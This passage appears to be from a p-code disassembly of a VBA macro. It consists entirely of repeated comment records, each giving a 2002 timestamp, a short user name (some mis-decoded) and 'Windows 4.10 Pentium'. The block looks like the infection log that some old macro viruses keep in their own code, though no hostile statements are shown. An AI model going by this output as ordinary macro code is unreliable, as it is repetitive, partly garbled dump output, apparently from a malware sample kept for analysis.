' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6866:
' Line #6867:
' Line #6868:
' 	QuoteRem 0x0000 0x0011 "06.03.02 14:32:55"
' Line #6869:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6870:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6871:
' Line #6872:
' Line #6873:
' 	QuoteRem 0x0000 0x0011 "07.03.02 10:12:25"
' Line #6874:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6875:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6876:
' Line #6877:
' Line #6878:
' 	QuoteRem 0x0000 0x0011 "07.03.02 11:28:18"
' Line #6879:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6880:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6881:
' Line #6882:
' Line #6883:
' 	QuoteRem 0x0000 0x0011 "07.03.02 12:03:23"
' Line #6884:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6885:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6886:
' Line #6887:
' Line #6888:
' 	QuoteRem 0x0000 0x0011 "07.03.02 12:50:56"
' Line #6889:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6890:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6891:
' Line #6892:
' Line #6893:
' 	QuoteRem 0x0000 0x0011 "07.03.02 12:51:39"
' Line #6894:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6895:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6896:
' Line #6897:
' Line #6898:
' 	QuoteRem 0x0000 0x0011 "07.03.02 14:27:30"
' Line #6899:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6900:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6901:
' Line #6902:
' Line #6903:
' 	QuoteRem 0x0000 0x0010 "09.03.02 0:55:54"
' Line #6904:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6905:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6906:
' Line #6907:
' Line #6908:
' 	QuoteRem 0x0000 0x0010 "11.03.02 9:58:20"
' Line #6909:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6910:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6911:
' Line #6912:
' Line #6913:
' 	QuoteRem 0x0000 0x0011 "11.03.02 10:02:46"
' Line #6914:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6915:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6916:
' Line #6917:
' Line #6918:
' 	QuoteRem 0x0000 0x0011 "11.03.02 10:53:18"
' Line #6919:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6920:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6921:
' Line #6922:
' Line #6923:
' 	QuoteRem 0x0000 0x0011 "11.03.02 10:54:02"
' Line #6924:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6925:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6926:
' Line #6927:
' Line #6928:
' 	QuoteRem 0x0000 0x0011 "11.03.02 10:59:42"
' Line #6929:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6930:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6931:
' Line #6932:
' Line #6933:
' 	QuoteRem 0x0000 0x0011 "11.03.02 13:58:12"
' Line #6934:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6935:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6936:
' Line #6937:
' Line #6938:
' 	QuoteRem 0x0000 0x0011 "13.03.02 13:05:04"
' Line #6939:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6940:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6941:
' Line #6942:
' Line #6943:
' 	QuoteRem 0x0000 0x0011 "13.03.02 13:32:47"
' Line #6944:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6945:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6946:
' Line #6947:
' Line #6948:
' 	QuoteRem 0x0000 0x0011 "13.03.02 13:34:35"
' Line #6949:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6950:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6951:
' Line #6952:
' Line #6953:
' 	QuoteRem 0x0000 0x0011 "13.03.02 13:37:58"
' Line #6954:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6955:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6956:
' Line #6957:
' Line #6958:
' 	QuoteRem 0x0000 0x0011 "13.03.02 13:39:23"
' Line #6959:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6960:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6961:
' Line #6962:
' Line #6963:
' 	QuoteRem 0x0000 0x0011 "13.03.02 13:44:33"
' Line #6964:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6965:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6966:
' Line #6967:
' Line #6968:
' 	QuoteRem 0x0000 0x0011 "13.03.02 13:46:46"
' Line #6969:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6970:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6971:
' Line #6972:
' Line #6973:
' 	QuoteRem 0x0000 0x0011 "13.03.02 13:54:35"
' Line #6974:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6975:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6976:
' Line #6977:
' Line #6978:
' 	QuoteRem 0x0000 0x0011 "13.03.02 13:55:33"
' Line #6979:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6980:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6981:
' Line #6982:
' Line #6983:
' 	QuoteRem 0x0000 0x0011 "13.03.02 13:56:46"
' Line #6984:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6985:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6986:
' Line #6987:
' Line #6988:
' 	QuoteRem 0x0000 0x0011 "13.03.02 13:59:05"
' Line #6989:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6990:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6991:
' Line #6992:
' Line #6993:
' 	QuoteRem 0x0000 0x0011 "13.03.02 14:21:24"
' Line #6994:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6995:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6996:
' Line #6997:
' Line #6998:
' 	QuoteRem 0x0000 0x0011 "13.03.02 14:29:20"
' Line #6999:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7000:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7001:
' Line #7002:
' Line #7003:
' 	QuoteRem 0x0000 0x0011 "13.03.02 14:38:25"
' Line #7004:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7005:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7006:
' Line #7007:
' Line #7008:
' 	QuoteRem 0x0000 0x0011 "14.03.02 12:34:16"
' Line #7009:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7010:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7011:
' Line #7012:
' Line #7013:
' 	QuoteRem 0x0000 0x0010 "15.03.02 9:28:57"
' Line #7014:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7015:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7016:
' Line #7017:
' Line #7018:
' 	QuoteRem 0x0000 0x0010 "15.03.02 9:48:46"
' Line #7019:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7020:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7021:
' Line #7022:
' Line #7023:
' 	QuoteRem 0x0000 0x0011 "15.03.02 11:13:10"
' Line #7024:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7025:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7026:
' Line #7027:
' Line #7028:
' 	QuoteRem 0x0000 0x0011 "15.03.02 14:26:15"
' Line #7029:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7030:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7031:
' Line #7032:
' Line #7033:
' 	QuoteRem 0x0000 0x0011 "15.03.02 15:21:07"
' Line #7034:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7035:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7036:
' Line #7037:
' Line #7038:
' 	QuoteRem 0x0000 0x0011 "18.03.02 12:00:34"
' Line #7039:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7040:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7041:
' Line #7042:
' Line #7043:
' 	QuoteRem 0x0000 0x0011 "18.03.02 12:04:56"
' Line #7044:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7045:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7046:
' Line #7047:
' Line #7048:
' 	QuoteRem 0x0000 0x0011 "18.03.02 12:13:25"
' Line #7049:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7050:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7051:
' Line #7052:
' Line #7053:
' 	QuoteRem 0x0000 0x0011 "18.03.02 12:16:11"
' Line #7054:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7055:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7056:
' Line #7057:
' Line #7058:
' 	QuoteRem 0x0000 0x0011 "19.03.02 11:53:20"
' Line #7059:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7060:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7061:
' Line #7062:
' Line #7063:
' 	QuoteRem 0x0000 0x0011 "19.03.02 11:55:27"
' Line #7064:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7065:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7066:
' Line #7067:
' Line #7068:
' 	QuoteRem 0x0000 0x0011 "19.03.02 12:13:02"
' Line #7069:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7070:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7071:
' Line #7072:
' Line #7073:
' 	QuoteRem 0x0000 0x0011 "20.03.02 10:09:45"
' Line #7074:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7075:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7076:
' Line #7077:
' Line #7078:
' 	QuoteRem 0x0000 0x0011 "20.03.02 13:34:46"
' Line #7079:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7080:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7081:
' Line #7082:
' Line #7083:
' 	QuoteRem 0x0000 0x0011 "20.03.02 13:43:56"
' Line #7084:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7085:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7086:
' Line #7087:
' Line #7088:
' 	QuoteRem 0x0000 0x0011 "20.03.02 14:21:03"
' Line #7089:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7090:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7091:
' Line #7092:
' Line #7093:
' 	QuoteRem 0x0000 0x0011 "20.03.02 14:26:43"
' Line #7094:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7095:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7096:
' Line #7097:
' Line #7098:
' 	QuoteRem 0x0000 0x0011 "21.03.02 13:52:01"
' Line #7099:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7100:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7101:
' Line #7102:
' Line #7103:
' 	QuoteRem 0x0000 0x0011 "21.03.02 17:32:38"
' Line #7104:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7105:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7106:
' Line #7107:
' Line #7108:
' 	QuoteRem 0x0000 0x0011 "22.03.02 11:06:27"
' Line #7109:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7110:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7111:
' Line #7112:
' Line #7113:
' 	QuoteRem 0x0000 0x0011 "22.03.02 11:09:28"
' Line #7114:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7115:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7116:
' Line #7117:
' Line #7118:
' 	QuoteRem 0x0000 0x0011 "22.03.02 12:13:11"
' Line #7119:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7120:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7121:
' Line #7122:
' Line #7123:
' 	QuoteRem 0x0000 0x0011 "22.03.02 12:40:31"
' Line #7124:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7125:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7126:
' Line #7127:
' Line #7128:
' 	QuoteRem 0x0000 0x0011 "22.03.02 14:29:58"
' Line #7129:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7130:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7131:
' Line #7132:
' Line #7133:
' 	QuoteRem 0x0000 0x0011 "22.03.02 15:13:00"
' Line #7134:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7135:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7136:
' Line #7137:
' Line #7138:
' 	QuoteRem 0x0000 0x0011 "22.03.02 16:56:29"
' Line #7139:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7140:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7141:
' Line #7142:
' Line #7143:
' 	QuoteRem 0x0000 0x0011 "22.03.02 16:58:12"
' Line #7144:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7145:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7146:
' Line #7147:
' Line #7148:
' 	QuoteRem 0x0000 0x0011 "22.03.02 17:01:02"
' Line #7149:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7150:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7151:
' Line #7152:
' Line #7153:
' 	QuoteRem 0x0000 0x0010 "25.03.02 9:31:12"
' Line #7154:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7155:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7156:
' Line #7157:
' Line #7158:
' 	QuoteRem 0x0000 0x0011 "26.03.02 11:13:52"
' Line #7159:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7160:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7161:
' Line #7162:
' Line #7163:
' 	QuoteRem 0x0000 0x0011 "26.03.02 13:55:07"
' Line #7164:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7165:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7166:
' Line #7167:
' Line #7168:
' 	QuoteRem 0x0000 0x0011 "26.03.02 15:17:50"
' Line #7169:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7170:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7171:
' Line #7172:
' Line #7173:
' 	QuoteRem 0x0000 0x0011 "26.03.02 15:18:50"
' Line #7174:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7175:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7176:
' Line #7177:
' Line #7178:
' 	QuoteRem 0x0000 0x0011 "26.03.02 15:22:50"
' Line #7179:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7180:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7181:
' Line #7182:
' Line #7183:
' 	QuoteRem 0x0000 0x0011 "27.03.02 12:44:45"
' Line #7184:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7185:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7186:
' Line #7187:
' Line #7188:
' 	QuoteRem 0x0000 0x0011 "29.03.02 11:34:44"
' Line #7189:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7190:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7191:
' Line #7192:
' Line #7193:
' 	QuoteRem 0x0000 0x0011 "29.03.02 11:36:47"
' Line #7194:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7195:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7196:
' Line #7197:
' Line #7198:
' 	QuoteRem 0x0000 0x0011 "29.03.02 11:44:28"
' Line #7199:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #7200:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7201:
' Line #7202:
' Line #7203:
' 	QuoteRem 0x0000 0x0011 "29.03.02 15:47:32"
' Line #7204:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7205:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7206:
' Line #7207:
' Line #7208:
' 	QuoteRem 0x0000 0x0011 "29.03.02 16:42:08"
' Line #7209:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7210:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7211:
' Line #7212:
' Line #7213:
' 	QuoteRem 0x0000 0x0011 "29.03.02 17:26:29"
' Line #7214:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7215:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7216:
' Line #7217:
' Line #7218:
' 	QuoteRem 0x0000 0x0011 "29.03.02 17:35:02"
' Line #7219:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7220:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7221:
' Line #7222:
' Line #7223:
' 	QuoteRem 0x0000 0x0011 "29.03.02 17:35:43"
' Line #7224:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7225:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7226:
' Line #7227:
' Line #7228:
' 	QuoteRem 0x0000 0x0011 "29.03.02 17:37:30"
' Line #7229:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7230:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7231:
' Line #7232:
' Line #7233:
' 	QuoteRem 0x0000 0x0011 "29.03.02 17:39:15"
' Line #7234:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7235:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7236:
' Line #7237:
' Line #7238:
' 	QuoteRem 0x0000 0x0011 "29.03.02 17:40:16"
' Line #7239:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7240:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7241:
' Line #7242:
' Line #7243:
' 	QuoteRem 0x0000 0x0011 "29.03.02 17:41:01"
' Line #7244:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7245:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7246:
' Line #7247:
' Line #7248:
' 	QuoteRem 0x0000 0x0011 "29.03.02 17:42:34"
' Line #7249:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7250:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7251:
' Line #7252:
' Line #7253:
' 	QuoteRem 0x0000 0x0011 "01.04.02 11:24:50"
' Line #7254:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7255:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7256:
' Line #7257:
' Line #7258:
' 	QuoteRem 0x0000 0x0011 "01.04.02 11:26:11"
' Line #7259:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7260:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7261:
' Line #7262:
' Line #7263:
' 	QuoteRem 0x0000 0x0011 "01.04.02 12:31:45"
' Line #7264:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7265:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7266:
' Line #7267:
' Line #7268:
' 	QuoteRem 0x0000 0x0011 "01.04.02 12:33:08"
' Line #7269:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7270:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7271:
' Line #7272:
' Line #7273:
' 	QuoteRem 0x0000 0x0011 "01.04.02 12:40:33"
' Line #7274:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7275:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7276:
' Line #7277:
' Line #7278:
' 	QuoteRem 0x0000 0x0011 "01.04.02 14:06:45"
' Line #7279:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7280:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7281:
' Line #7282:
' Line #7283:
' 	QuoteRem 0x0000 0x0011 "01.04.02 14:08:16"
' Line #7284:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7285:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7286:
' Line #7287:
' Line #7288:
' 	QuoteRem 0x0000 0x0011 "01.04.02 14:46:24"
' Line #7289:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7290:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7291:
' Line #7292:
' Line #7293:
' 	QuoteRem 0x0000 0x0011 "01.04.02 17:19:45"
' Line #7294:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7295:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7296:
' Line #7297:
' Line #7298:
' 	QuoteRem 0x0000 0x0011 "01.04.02 17:20:51"
' Line #7299:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7300:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7301:
' Line #7302:
' Line #7303:
' 	QuoteRem 0x0000 0x0011 "01.04.02 17:22:55"
' Line #7304:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7305:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7306:
' Line #7307:
' Line #7308:
' 	QuoteRem 0x0000 0x0011 "01.04.02 17:24:52"
' Line #7309:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7310:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7311:
' Line #7312:
' Line #7313:
' 	QuoteRem 0x0000 0x0010 "02.04.02 9:16:59"
' Line #7314:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7315:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7316:
' Line #7317:
' Line #7318:
' 	QuoteRem 0x0000 0x0010 "02.04.02 9:32:16"
' Line #7319:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7320:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7321:
' Line #7322:
' Line #7323:
' 	QuoteRem 0x0000 0x0010 "02.04.02 9:33:32"
' Line #7324:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7325:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7326:
' Line #7327:
' Line #7328:
' 	QuoteRem 0x0000 0x0011 "02.04.02 12:00:06"
' Line #7329:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7330:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7331:
' Line #7332:
' Line #7333:
' 	QuoteRem 0x0000 0x0011 "02.04.02 15:37:51"
' Line #7334:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7335:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7336:
' Line #7337:
' Line #7338:
' 	QuoteRem 0x0000 0x0010 "03.04.02 9:28:54"
' Line #7339:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7340:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7341:
' Line #7342:
' Line #7343:
' 	QuoteRem 0x0000 0x0011 "03.04.02 16:39:02"
' Line #7344:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7345:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7346:
' Line #7347:
' Line #7348:
' 	QuoteRem 0x0000 0x0011 "03.04.02 16:39:38"
' Line #7349:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7350:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7351:
' Line #7352:
' Line #7353:
' 	QuoteRem 0x0000 0x0011 "03.04.02 16:56:04"
' Line #7354:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7355:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7356:
' Line #7357:
' Line #7358:
' 	QuoteRem 0x0000 0x0010 "04.04.02 9:08:58"
' Line #7359:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7360:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7361:
' Line #7362:
' Line #7363:
' 	QuoteRem 0x0000 0x0011 "04.04.02 10:52:45"
' Line #7364:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7365:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7366:
' Line #7367:
' Line #7368:
' 	QuoteRem 0x0000 0x0011 "04.04.02 11:01:23"
' Line #7369:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7370:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7371:
' Line #7372:
' Line #7373:
' 	QuoteRem 0x0000 0x0011 "04.04.02 14:19:13"
' Line #7374:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7375:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7376:
' Line #7377:
' Line #7378:
' 	QuoteRem 0x0000 0x0011 "04.04.02 16:05:37"
' Line #7379:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7380:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7381:
' Line #7382:
' Line #7383:
' 	QuoteRem 0x0000 0x0011 "04.04.02 16:23:56"
' Line #7384:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7385:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7386:
' Line #7387:
' Line #7388:
' 	QuoteRem 0x0000 0x0011 "04.04.02 16:28:00"
' Line #7389:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7390:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7391:
' Line #7392:
' Line #7393:
' 	QuoteRem 0x0000 0x0011 "04.04.02 16:36:25"
' Line #7394:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7395:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7396:
' Line #7397:
' Line #7398:
' 	QuoteRem 0x0000 0x0011 "04.04.02 16:48:13"
' Line #7399:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7400:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7401:
' Line #7402:
' Line #7403:
' 	QuoteRem 0x0000 0x0011 "04.04.02 16:49:01"
' Line #7404:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7405:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7406:
' Line #7407:
' Line #7408:
' 	QuoteRem 0x0000 0x0011 "04.04.02 18:24:41"
' Line #7409:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7410:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7411:
' Line #7412:
' Line #7413:
' 	QuoteRem 0x0000 0x0010 "05.04.02 9:34:45"
' Line #7414:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7415:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7416:
' Line #7417:
' Line #7418:
' 	QuoteRem 0x0000 0x0010 "05.04.02 9:35:16"
' Line #7419:
' 	QuoteRem 0x0000 0x0003 "Îðã"
' Line #7420:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
